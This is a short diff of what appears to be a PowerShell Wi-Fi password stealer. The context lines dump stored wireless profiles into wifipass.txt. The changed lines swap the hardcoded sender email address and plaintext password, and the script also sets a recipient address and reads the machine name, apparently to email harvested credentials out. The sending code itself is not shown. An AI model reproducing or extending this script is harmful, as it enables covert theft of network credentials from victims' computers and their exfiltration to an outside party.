@@ -11,8 +11,8 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
-$FROM = "rashitomar100@gmail.com"
-$PASS = "createpassword"
+$FROM = "rishabh_a7da6@protonmail.com"
+$PASS = "shouldbegoodenough"
 $TO = "rishabhtomar1603@gmail.com"
 
 $PC_NAME = "$env:computername"
